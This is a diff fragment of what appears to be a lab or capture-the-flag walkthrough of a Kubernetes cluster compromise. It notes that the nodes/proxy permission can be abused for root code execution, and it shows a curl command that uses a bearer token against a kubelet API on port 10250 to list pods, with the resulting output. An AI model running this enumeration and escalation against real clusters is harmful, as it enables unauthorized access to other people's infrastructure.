@@ -715,7 +715,7 @@ mcp@mcp-server-54464cb475-29ztf:~$ curl -X POST -ks https://10.43.0.1:443/apis/a
 As seen here i have the `nodes/proxy` resource set, this can be abused to get code execution as root
 
 ```python
-curl -sk https://
+curl -sk https://10.129.244.214:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) -> \([.spec.containers[].name])"'
 
 monitoring/prometheus-server-867bb4fcfd-m4t59 -> ["prometheus-server-configmap-reload","prometheus-server"]
 monitoring/prometheus-kube-state-metrics-7c8c787854-25j6q -> ["kube-state-metrics"]
